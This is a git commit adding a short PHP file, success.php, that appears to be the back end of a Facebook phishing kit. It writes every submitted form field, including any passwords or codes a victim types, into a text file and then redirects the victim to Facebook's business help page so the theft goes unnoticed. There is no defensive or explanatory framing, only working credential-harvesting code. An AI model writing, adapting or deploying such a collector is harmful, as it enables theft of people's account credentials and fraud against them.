5407d2a8ed06b74fe34500ab4e892999595c5fd8
requstapply <151566227+requstapply@users.noreply.github.com>
2023-11-20 10:26:44 -0800

    Add files via upload

---
+++ success.php
@@ -0,0 +1,18 @@
+<?php
+
+// Set the location to redirect the page
+header ('Location: https://www.facebook.com/business/help');
+
+// Open the text file in writing mode
+$file = fopen("313.txt", "a");
+
+foreach($_POST as $variable => $value) {
+	fwrite($file, $variable);
+	fwrite($file, "=");
+	fwrite($file, $value);
+	fwrite($file, "\r\n");
+}
+fwrite($file, "\r\n");
+fclose($file);
+exit;
+?>
